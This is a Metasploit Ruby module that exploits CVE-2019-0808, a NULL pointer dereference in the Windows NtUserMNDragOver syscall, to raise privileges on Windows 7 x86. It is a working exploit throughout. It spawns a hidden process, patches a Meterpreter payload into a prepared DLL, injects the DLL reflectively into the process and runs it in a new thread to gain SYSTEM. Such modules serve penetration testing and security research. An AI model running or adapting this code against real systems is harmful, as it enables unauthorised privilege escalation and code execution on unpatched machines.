##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/file'
require 'msf/core/exploit/exe'
require 'msf/core/post/windows/priv'

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows NtUserMNDragOver Local Privilege Elevation',
      'Description'    => %q(
        This module exploits a NULL pointer dereference vulnerability in the win32
        NtUserMNDragOver() syscall.
        The NULL pointer dereference occurs because the xxxMNFindWindowFromPoint()
        function does not effectively check the validity of the tagPOPUPMENU objects it
        processes before passing them on to MNGetpItemFromIndex(), where the NULL
        pointer dereference will occur.
        This module has been tested against Windows 7 x86 SP0 and SP1. Offsets within
        the solution may need to be adjusted to work with other versions of Windows,
        such as Windows Server 2008.
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'ClÃ©ment Lecigne', # discovery
          'Grant Willcox',   # exploit
          'timwr'            # msf module
        ],
      'Platform'       => 'win',
      'SessionTypes'   => ['meterpreter'],
      'Targets'        =>
        [
          ['Windows 7 x86', { 'Arch' => ARCH_X86 }]
        ],
      'SideEffects'    => [SCREEN_EFFECTS],
      'References'     =>
        [
          ['CVE', '2019-0808'],
          ['URL', 'https://github.com/exodusintel/CVE-2019-0808'],
          ['URL', 'https://github.com/ze0r/cve-2019-0808-poc'],
          ['URL', 'http://blogs.360.cn/post/RootCause_CVE-2019-0808_EN.html'],
          ['URL', 'https://blog.exodusintel.com/2019/05/17/windows-within-windows/'],
        ],
      'DisclosureDate' => 'Mar 12 2019',
      'DefaultTarget'  => 0,
    ))
    register_options([
      OptString.new('PROCESS', [true, 'Name of process to spawn and inject dll into.', "notepad.exe"])
    ])
  end

  def setup_process
    process_name = datastore['PROCESS']
    begin
      print_status("Launching #{process_name} to host the exploit...")
      launch_process = client.sys.process.execute(process_name, nil, 'Hidden' => true)
      process = client.sys.process.open(launch_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Sandboxes could not allow to create a new process
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_error('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end
    process
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if sysinfo['Architecture'] != ARCH_X86
      fail_with(Failure::NoTarget, 'Running against 64-bit systems is not supported')
    end

    process = setup_process
    library_data = exploit_data('CVE-2019-0808', 'exploit.dll')
    pidx = library_data.index('PAYLOAD:')
    if pidx
      library_data[pidx, payload.encoded.length] = payload.encoded
    end
    print_status("Injecting exploit into #{process.pid} ...")
    exploit_mem, offset = inject_dll_data_into_process(process, library_data)
    print_status("Executing exploit...")
    process.thread.create(exploit_mem + offset)
  end
end
